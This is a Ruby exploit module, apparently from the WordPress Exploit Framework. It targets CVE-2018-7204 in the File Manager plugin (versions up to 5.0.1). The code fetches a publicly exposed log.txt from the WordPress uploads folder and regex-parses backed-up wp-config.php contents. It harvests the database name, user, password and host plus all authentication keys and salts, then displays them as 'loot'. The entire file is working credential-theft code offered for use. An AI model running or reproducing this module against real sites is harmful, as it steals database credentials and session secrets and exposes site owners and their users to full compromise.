# frozen_string_literal: true

class Wpxf::Auxiliary::FileManagerDatabaseCredentialsDisclosure < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'File Manager <= 5.0.1 Database Credentials Disclosure',
      desc: %(
        Prior to version 5.0.2 of the File Manager plugin, any changes
        made to the wp-config.php file via the plugin would result
        in a backup being stored in a publicly accessible plain text
        file. This module will download and parse the file to harvest
        the database credentials and salts.
      ),
      author: [
        'Colette Chamberland', # Disclosure
        'rastating'            # WPXF module
      ],
      references: [
        ['CVE', '2018-7204'],
        ['WPVDB', '9036']
      ],
      date: 'Mar 02 2018'
    )
  end

  def check
    check_plugin_version_from_changelog('file-manager', 'readme.txt', '5.0.2')
  end

  def log_url
    normalize_uri(wordpress_url_uploads, 'file-manager', 'log.txt')
  end

  def parse_log(log)
    loot = [{ key: 'Key', value: 'Value' }]
    wanted_keys = [
      'DB_NAME',
      'DB_USER',
      'DB_PASSWORD',
      'DB_HOST',
      'AUTH_KEY',
      'SECURE_AUTH_KEY',
      'LOGGED_IN_KEY',
      'NONCE_KEY',
      'AUTH_SALT',
      'SECURE_AUTH_SALT',
      'LOGGED_IN_SALT',
      'NONCE_SALT'
    ]

    matches = log.scan(/define\(\\'.+?',\s+?\\'.+?'\);/i)
    matches.each do |match|
      kvp = match.match(/define\(\\'(.+?)\\',\s+?\\'(.+?)\\'\);/i)&.captures
      next if kvp.nil?
      loot.push(key: kvp[0], value: kvp[1]) if wanted_keys.include? kvp[0]
    end

    loot
  end

  def run
    return false unless super

    emit_info 'Downloading log...'
    res = execute_get_request(url: log_url)
    if res&.code != 200
      emit_error 'Failed to download log'
      return false
    end

    emit_info 'Parsing log...'
    loot = parse_log(res.body)

    if loot.length == 1
      emit_error 'Could not find wp-config.php within the log'
      return false
    end

    emit_table loot
    true
  end
end
